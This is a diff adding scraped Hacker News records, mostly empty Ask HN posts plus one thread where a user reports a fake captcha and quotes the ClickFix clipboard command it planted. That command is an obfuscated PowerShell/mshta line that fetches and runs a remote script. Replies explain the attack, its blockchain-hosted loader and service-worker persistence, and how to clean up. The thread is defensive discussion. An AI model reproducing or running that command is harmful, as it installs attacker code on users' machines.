@@ -2418,5 +2418,2355 @@
       ],
       "is_nsfw": false
     }
+  },
+  {
+    "post": {
+      "id": "b969a7cbc13f11caba259d2255430e56",
+      "source_id": "49083696",
+      "title": "Ask HN: How do you use Copilot in the CLI, App, and IDE?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.576844",
+      "updated_at": "2026-07-28T17:17:16.576844",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "5abe0c251b4b6d3de29a11668f69ec05",
+        "source_id": "EspressoGPT",
+        "username": "EspressoGPT",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 3,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49083696",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:21.643782",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "22a72f89cde95c5a96daafbe59e54fc2",
+      "source_id": "49085002",
+      "title": "Ask HN: How do you audit your app for compliance?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.577735",
+      "updated_at": "2026-07-28T17:17:16.577735",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "fc82d5d5aac219a763b30f997fce5be3",
+        "source_id": "Luxter",
+        "username": "Luxter",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 2,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49085002",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:24.873434",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "bd0fe0eca6934d8584ce0bbf395f8a17",
+      "source_id": "49080135",
+      "title": "Ask HN: How to rewrite `Claude.md` and install the skill for Opus5 and Fable5",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.578450",
+      "updated_at": "2026-07-28T17:17:16.578450",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "3c3cb70bcb3e51bbc4a5a23618c2d13f",
+        "source_id": "hyhmrright",
+        "username": "hyhmrright",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 5,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49080135",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:29.366142",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "f4d8aacf5284ec029625d54bb2411abf",
+      "source_id": "49084404",
+      "title": "Ask HN: Crooked Timber showed showed me a virus captcha, What now?",
+      "content": {
+        "text": "<div class=\"toptext\" style=\"margin-top:4px\">Hello everyone,\nThis morning, as i started my shift, i thought i would start visiting some news blogs / websites to kick off the day. When it got to Crooked Timber i saw a captcha page instead, it looked like a traditional Google captcha.\nI clicked it, the spinner spun, and a box opened on the right, showing the traditional \"Verify you're human\" white title on a blue background.<p>It showed 2 \"Manual Verification Steps\" :\n1. Press Win + R\n2. Press Ctrl + V and press Run<p>At first i assumed it was a new type of captcha checking i a physical keyboard was attached to the browser. But i instantly recognized the attempt to make me run a script on my machine.<p>I opened a new type and to my surprise, the something new was in my clipboard : \n\"pcalua -a \"PowerShell\" -c \"saps cmd '/v/c m^s^h^t^a h^t^t^p^s^:^/^/fine-work-team.com/6272' -Wi Hi\"\"<p>I submited it to one of LLMs my work gives me access to, which told me to absolutly not run it (i wasn't planning to) and explained the command would download and run a script from the URL.<p>How do i protect myself from these scams / hack attempts in the future ? i always tought of myself \"prepared\" but i was surprised.<p>Has this happened to you before ? How do you protect yourself ?</p></p></p></p></p></p></div>",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.578996",
+      "updated_at": "2026-07-28T17:17:16.578996",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "d296658784ad0d75e20dcab0dab32d1a",
+        "source_id": "Jgoauh",
+        "username": "Jgoauh",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 38,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49084404",
+      "section": "Ask HN"
+    },
+    "replies": [
+      {
+        "id": "31366eafbb7c0e60d69de6a27967e09e",
+        "source_id": "49084733",
+        "content": {
+          "text": "This is called a \"ClickFix\" attack. There is really _never_ a time when a CAPTCHA will require you to execute code on your machine. The attack is basically getting someone to accidentally run malicious code. - ctrl + R brings up the Windows \"run\" dialogue. - the code executes a powershell command that reaches out to a remote server - if successful, the remote server answers and you have installed a dropper or something. Really, you should never do _anything_ like this for any website. You don't need to protect yourself. This is sort of equivalent (in the strict metaphorical sense) of getting a call from your bank and they ask you for your banking password: you just never do it, no matter what. Same thing here. You don't ever execute code via the run dialogue to solve a CAPTHCA. Never. https://www.sentinelone.com/blog/how-clickfix-is-weaponizing... reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.541818",
+        "updated_at": "2026-07-28T17:17:31.541818",
+        "author": {
+          "id": "87bfa4fea73b4070c3f77f0e1c85cbfa",
+          "source_id": "everdrive",
+          "username": "everdrive",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "7ffd1fe3bc591afe3329522bc99dc943",
+        "source_id": "49085498",
+        "content": {
+          "text": "> There is really _never_ a time when a CAPTCHA will require you to execute code on your machine. I think the concern is the user not knowing they're executing code on their machine. And as a counterexample: some captchas require you to compute something expensive to prove you're not a llm scraper or whatever. It's normal for captchas to require you to execute code on your machine, it's just usually done within the browser's sandbox. And anyway, these things are completely incomprehensible to non-technical users. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.542381",
+        "updated_at": "2026-07-28T17:17:31.542381",
+        "author": {
+          "id": "9e47be17e761d6e6cf30b54b6503aa3c",
+          "source_id": "tasuki",
+          "username": "tasuki",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "80eb30cb108a14a3a5102d83b3b7ac03",
+        "source_id": "49086122",
+        "content": {
+          "text": ">And as a counterexample: some captchas require you to compute something expensive to prove you're not a llm scraper or whatever. I've never run into one of these. What do they ask you to compute? reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.542873",
+        "updated_at": "2026-07-28T17:17:31.542873",
+        "author": {
+          "id": "87bfa4fea73b4070c3f77f0e1c85cbfa",
+          "source_id": "everdrive",
+          "username": "everdrive",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "60e46ce6aaab2f927e18836c34570a16",
+        "source_id": "49085925",
+        "content": {
+          "text": "but people pipes a shell script from a URL to bash all the time. with enough practices, it becames second nature. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.543392",
+        "updated_at": "2026-07-28T17:17:31.543392",
+        "author": {
+          "id": "201de002ca8af23bc9481263d0a4fff9",
+          "source_id": "cavoirom",
+          "username": "cavoirom",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "f571878aa62d4b92c6d42144202ba77c",
+        "source_id": "49086058",
+        "content": {
+          "text": "True enough... but even then, you can download and review the script before running.  Usually it just detects your OS/Distro and then downloads and runs the appropriate installer.  You can also do this by hand. For that matter, there's always a risk of downloading/installing anything from anywhere.  There have been successful compromises of many application supply chains at this point in official release paths.  You will accept some risk regardless of your approach. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.543959",
+        "updated_at": "2026-07-28T17:17:31.543959",
+        "author": {
+          "id": "cf61eb0472eadd8cfa81e05701b54c1d",
+          "source_id": "tracker1",
+          "username": "tracker1",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "c1b87a90280615bbb4cbbaa915659c18",
+        "source_id": "49086002",
+        "content": {
+          "text": "I make it a rule never to give confidential information to an incoming call.  I had a primary doctor whose office would send notification calls immediately asking for part of my social security number, I always hung up.... I figured out it was for the doctor later, and commented that it was ridiculous and I wouldn't ever receive any such notifications. Just that simple practice has kept me reasonably safe, even from an AI scam once. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.544548",
+        "updated_at": "2026-07-28T17:17:31.544548",
+        "author": {
+          "id": "cf61eb0472eadd8cfa81e05701b54c1d",
+          "source_id": "tracker1",
+          "username": "tracker1",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "540d3fc65be71476c09e2d3e709bed52",
+        "source_id": "49086047",
+        "content": {
+          "text": "If one user makes the mistake, it would be fair to blame them. Because thousands of users make the same mistake, blame needs to be directed at Windows UX. MS could fix this easily by 1) moving Run to optional features and 2) removing online features from Start to make performance comparable. The other \"run\" interfaces (terminal, conhost, Powershell) are sufficiently menacing to scare away non-devs already. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.545169",
+        "updated_at": "2026-07-28T17:17:31.545169",
+        "author": {
+          "id": "e5ac21ee26a2bb2ce06b40833d9aa1e0",
+          "source_id": "LikesPwsh",
+          "username": "LikesPwsh",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "e89b347e1198ffbbd67eac086b2e075f",
+        "source_id": "49085170",
+        "content": {
+          "text": "$dayjob just sent out a corporate wide email saying the same thing...  I guess it's starting to go around...  it's been a while since I've seen a fake website telling people to eg. disable UAC. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.545777",
+        "updated_at": "2026-07-28T17:17:31.545777",
+        "author": {
+          "id": "d4241a57edaa01da2c154569bafc1c00",
+          "source_id": "nubinetwork",
+          "username": "nubinetwork",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "1dba55f0efaa6e3ab7019c2b5f06f8c4",
+        "source_id": "49085569",
+        "content": {
+          "text": "I've seen sites with similar fake captchas posted twice in the last month by old time regular users. My guess is that the sites were infected after they saw and decide to post it here. As a workaround, is it possible to disable Ctr+R to add some friction in case I am distracted? reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.546420",
+        "updated_at": "2026-07-28T17:17:31.546420",
+        "author": {
+          "id": "851b0a301970b5ad319b0814d1286f40",
+          "source_id": "gus_massa",
+          "username": "gus_massa",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "c7e7babe93b4eba3a0117407a9da728f",
+        "source_id": "49086283",
+        "content": {
+          "text": "> There is really _never_ a time when a CAPTCHA will require you to execute code on your machine. Oh yeah? What about Google saying “install the reCAPTCHA app in the App Store” < https://reclaimthenet.org/google-broke-recaptcha-for-de-goog... >? It’s absurd, but these nominally-security tools frequently genuinely train users to become susceptible to attacks. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.547134",
+        "updated_at": "2026-07-28T17:17:31.547134",
+        "author": {
+          "id": "cff4ea3c25d9492b5b98572aa471b5a5",
+          "source_id": "chrismorgan",
+          "username": "chrismorgan",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "d04b48f4947c49e7916aa5c446d795ad",
+        "source_id": "49086953",
+        "content": {
+          "text": "I ran into the same thing on a cooking blog (which I had visited many times before) a few weeks back. I was pretty mystified but like you, spidey sense kept me from running the code. It's insidious because it looks like it's coming from Captcha. I do have uBO Lite running on Chrome. Tried the website in Firefox and also got the same manual run thing. I wasn't sure what to do about it. Obviously I was unable to notify the blog owner. I came back to the website about a week later and it didn't come up again. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.547846",
+        "updated_at": "2026-07-28T17:17:31.547846",
+        "author": {
+          "id": "757b4887b800eb7576bf827ee3f56cf2",
+          "source_id": "fallinghawks",
+          "username": "fallinghawks",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "d80fa2cdb2ad12912e177bb41babeb9a",
+        "source_id": "49085021",
+        "content": {
+          "text": "Not directly answering your questions, but I just wanted to say: Great instincts! You saw something unusual, then 1. Stopped what you were doing. 2. Investigated to see if this was legitimate or malicious. 3. Identified a place to asked others about it. 4. Formulated a good question with enough background information to help people answer it. All around good job! Well done. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.548638",
+        "updated_at": "2026-07-28T17:17:31.548638",
+        "author": {
+          "id": "9e6884854fa6dc13d9aa9a94de8a20ad",
+          "source_id": "kstrauser",
+          "username": "kstrauser",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "8dbd87546ecba1158299e1fe9575a92f",
+        "source_id": "49085312",
+        "content": {
+          "text": "5. Paste the entire command on HN so the aspiring script kiddies have a launching point.\n6. ?\n7. Profit! reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.549382",
+        "updated_at": "2026-07-28T17:17:31.549382",
+        "author": {
+          "id": "ccc919c7c097d58f7c3b19a1671870a6",
+          "source_id": "SirFatty",
+          "username": "SirFatty",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "62593e03f4b5e3153019d526c2d01c02",
+        "source_id": "49085661",
+        "content": {
+          "text": "What’s the Venn diagram of 1) HN users, 2) on Windows, 3) willing to paste something tagged as malware into their own systems to verify? Given that the asker isn’t experienced enough to know for sure, erring on the side of giving all the information was the right call. If they didn’t, someone would be riding them about “how are we suppose to know if you don’t show us?”. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.550196",
+        "updated_at": "2026-07-28T17:17:31.550196",
+        "author": {
+          "id": "9e6884854fa6dc13d9aa9a94de8a20ad",
+          "source_id": "kstrauser",
+          "username": "kstrauser",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "f11a53d370803f7c8c12c5ff1056b0ba",
+        "source_id": "49086776",
+        "content": {
+          "text": "I guess it's ok then. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.550994",
+        "updated_at": "2026-07-28T17:17:31.550994",
+        "author": {
+          "id": "ccc919c7c097d58f7c3b19a1671870a6",
+          "source_id": "SirFatty",
+          "username": "SirFatty",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "de80139cb1d4de0b1bc7a9fb96d6389f",
+        "source_id": "49085377",
+        "content": {
+          "text": "5. Put the malicious payload directly into work AI system. \"Great instincts!\" lmao reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.551847",
+        "updated_at": "2026-07-28T17:17:31.551847",
+        "author": {
+          "id": "fba0500617f98f16858ffcc2b495410b",
+          "source_id": "paulyy_y",
+          "username": "paulyy_y",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "c2f495f41cc16ca81f16de48c656ec22",
+        "source_id": "49085614",
+        "content": {
+          "text": "I do this literally several times a week. “Hey Droid, this looks like malware. What do you make of it?” It’s the best sandbox I have near at hand for investigating things like that. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.552738",
+        "updated_at": "2026-07-28T17:17:31.552738",
+        "author": {
+          "id": "9e6884854fa6dc13d9aa9a94de8a20ad",
+          "source_id": "kstrauser",
+          "username": "kstrauser",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "7ad668a22529ddcb620feb959edeb929",
+        "source_id": "49085075",
+        "content": {
+          "text": "> How do you protect yourself Was the site itself actually infected(hacked)? If not, then all you need is adblock (like ublock origin). And that was true for last 20 years . If website actually got hacked then I don't know of any good solutions. It will be flagged soon or later, and new visitors will be blocked by \"Google Safe Browsing\". Using something like \"Qubes OS\" might protect you against attacks based on browser zero-days but VMs don't really protect against ClickFix when people usually share clipboard between host and client VMs. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.553669",
+        "updated_at": "2026-07-28T17:17:31.553669",
+        "author": {
+          "id": "f693157f98ef0fbd7e146ed64f5a3648",
+          "source_id": "Good4boothee",
+          "username": "Good4boothee",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "00d275ecd05603bd43e73f0083b4c4de",
+        "source_id": "49085467",
+        "content": {
+          "text": "Google is trying to normalize a new \"complete the captcha on your phone by scanning a QR code\" flow, which I'm sure will be a whole new vector for scams. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.554582",
+        "updated_at": "2026-07-28T17:17:31.554582",
+        "author": {
+          "id": "4e269717fed1a3fe3085580ce94d7fb4",
+          "source_id": "Retr0id",
+          "username": "Retr0id",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "f88154be16583546c4b9d4043fbabad5",
+        "source_id": "49085618",
+        "content": {
+          "text": "Can’t wait for the first “scan this code to verify” scam that takes you to a mobile Chrome 0day Or you could send them to download some spyware/adware Play Store app reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.555534",
+        "updated_at": "2026-07-28T17:17:31.555534",
+        "author": {
+          "id": "2fdeaf27a2faaa78c6b09203020ea3c5",
+          "source_id": "iamnothere",
+          "username": "iamnothere",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "22a89340c3d4c3ad06d3541600b0ff01",
+        "source_id": "49085822",
+        "content": {
+          "text": "Couldn't any exploit possible via that pathway also be executed based on a link? I don't see how a QR code makes the situation any worse. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.556496",
+        "updated_at": "2026-07-28T17:17:31.556496",
+        "author": {
+          "id": "cf5685c0300bb96eb42e269129c7d0b2",
+          "source_id": "OkayPhysicist",
+          "username": "OkayPhysicist",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "c2a7732247564f52adcc58e7a1e4c083",
+        "source_id": "49086482",
+        "content": {
+          "text": "Once users are habituated to scanning QR codes for verification, it becomes easier. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.557478",
+        "updated_at": "2026-07-28T17:17:31.557478",
+        "author": {
+          "id": "2fdeaf27a2faaa78c6b09203020ea3c5",
+          "source_id": "iamnothere",
+          "username": "iamnothere",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "fd9dabeaa5a5d5e5f0462eeaa8e6949c",
+        "source_id": "49085142",
+        "content": {
+          "text": "Do you have any browser extensions enabled? I've seen similar before where it wasn't the page itself that injected it - rather it was injected by a compromised/sold extension that has permissions on all pages. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.558638",
+        "updated_at": "2026-07-28T17:17:31.558638",
+        "author": {
+          "id": "f02a03ef432924f28b0337885ec605c4",
+          "source_id": "c0n5pir4cy",
+          "username": "c0n5pir4cy",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "9ba395945c6ef8ab6c2394019c870904",
+        "source_id": "49085553",
+        "content": {
+          "text": "Not this time. Go to crookedtimber dot org and you can still see it. Just don't follow the instructions... but clean your browser afterwards! It even supports Macs. But the Mac clipboard content is just \"Oops...\". P.S.: even worse: the crookedtimber site itself is infected. No third-party attack. It registers a service worker on the user's browser that stays even when you leave the site. Be sure to clean up the storage data after visiting that site. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.559731",
+        "updated_at": "2026-07-28T17:17:31.559731",
+        "author": {
+          "id": "c5a912b624de04fc713822de75d3d872",
+          "source_id": "deepsummer",
+          "username": "deepsummer",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "0fc90ede96ad6814e975b3501a0f5c97",
+        "source_id": "49086511",
+        "content": {
+          "text": "So done a much deeper analysis - there is an loader injected at the Wordpress side which triggers a read of a payload from a smart contract on the Ethereum chain. It stores this in localStorage, registers a ServiceWorker etc so it is persistent. It then spins up the ClickFix attack - limited to one time per day. I haven't dug into the payload given by the ClickFix attack yet. For people that have visited while it exists: 1. On Chrome go to chrome://serviceworker-internals search for crookedtimber and unregister the ServiceWorker 2. On Firefox go to about:debugging#/runtime/this-firefox, search for crookedtimber and unregister the ServiceWorker. If you want to be even safer - just clear all local data for CrookedTimber. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.560870",
+        "updated_at": "2026-07-28T17:17:31.560870",
+        "author": {
+          "id": "f02a03ef432924f28b0337885ec605c4",
+          "source_id": "c0n5pir4cy",
+          "username": "c0n5pir4cy",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "17418602f097f36d1e851059b0e9fa05",
+        "source_id": "49085720",
+        "content": {
+          "text": "I'm not getting it at all! I'm guessing something about my environment has caused it to cloak itself. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.561997",
+        "updated_at": "2026-07-28T17:17:31.561997",
+        "author": {
+          "id": "f02a03ef432924f28b0337885ec605c4",
+          "source_id": "c0n5pir4cy",
+          "username": "c0n5pir4cy",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "81c0d9e8fa5f3e7473c5ff1d2eb1d0ae",
+        "source_id": "49085923",
+        "content": {
+          "text": "Claude's analysis: \"it skips logged-in WordPress users (wordpress_logged_in_* cookie), skips /wp-admin and /wp-login.php, and rate-limits to once per day per visitor via localStorage. That's why site admins don't see it — and why you only saw it on first load.\" reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.563145",
+        "updated_at": "2026-07-28T17:17:31.563145",
+        "author": {
+          "id": "c5a912b624de04fc713822de75d3d872",
+          "source_id": "deepsummer",
+          "username": "deepsummer",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "a597f4ccb8928cb1b6545b1cda5fc018",
+        "source_id": "49086236",
+        "content": {
+          "text": "Doing a bit of digging too - it also filters only to users running MacOS or Windows and skips everything else which is why it will be invisible to the devices I tried it on. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.564340",
+        "updated_at": "2026-07-28T17:17:31.564340",
+        "author": {
+          "id": "f02a03ef432924f28b0337885ec605c4",
+          "source_id": "c0n5pir4cy",
+          "username": "c0n5pir4cy",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "3029d2ab18c8731d0027b9f284d2b528",
+        "source_id": "49085403",
+        "content": {
+          "text": "this is wildly complex, way more so than a traditional ClickFix attack. it's fetching JS scripts from a Ethereum/Base contract and executing them - i've never seen something like this before reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.565519",
+        "updated_at": "2026-07-28T17:17:31.565519",
+        "author": {
+          "id": "cfccd3feae583b94b498494667139c47",
+          "source_id": "bstsb",
+          "username": "bstsb",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "84de7004f1a6bcb5139dc3b1f54bbd5d",
+        "source_id": "49086123",
+        "content": {
+          "text": "Seems like the attack is still happening.[0] > 0. https://imgur.com/a/KnxRDKg reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.566756",
+        "updated_at": "2026-07-28T17:17:31.566756",
+        "author": {
+          "id": "a6565689bf0734fc0ec891e30967864b",
+          "source_id": "absqueued",
+          "username": "absqueued",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "8c7b5dc366b9443be3bcb7e8dc701cd0",
+        "source_id": "49085520",
+        "content": {
+          "text": "This exact technique has been around for a while; there are even government resources warning about it (e.g. https://www.michigan.gov/msp/divisions/intel-ops/cyber/mc3/c... - April 2025). As you might imagine, these attacks are aimed at less sophisticated users who may have no idea what Win+R even does, and who might be tricked into believing that this actually has anything to do with website verification. The site you visited -- or one of the resources it depends on -- might have been compromised. If you're enterprising, you could probably determine where the malicious script is getting loaded from by looking in the page source. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.568035",
+        "updated_at": "2026-07-28T17:17:31.568035",
+        "author": {
+          "id": "820b9d6da110572fb94d24b9071a94c9",
+          "source_id": "nneonneo",
+          "username": "nneonneo",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
